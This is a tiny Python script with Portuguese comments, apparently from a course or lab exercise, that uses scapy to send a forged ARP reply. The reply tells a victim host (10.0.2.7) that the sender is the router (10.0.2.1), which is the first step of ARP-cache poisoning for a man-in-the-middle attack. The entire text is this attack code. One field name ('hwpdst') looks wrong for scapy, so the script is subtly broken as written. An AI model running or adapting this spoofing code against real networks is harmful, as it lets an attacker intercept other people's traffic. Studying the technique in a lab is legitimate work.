#Criando um ataque spoofing 

import scapy.all as scapy

#cria o pacote arp
packet = scapy.ARP(op=2, pdst="10.0.2.7", hwpdst="08:00:27:08:af:07", psrc="10.0.2.1") #estou dizendo a vítima: eu tenho o endereço do roteador
scapy.send(packet) #enviando o pacote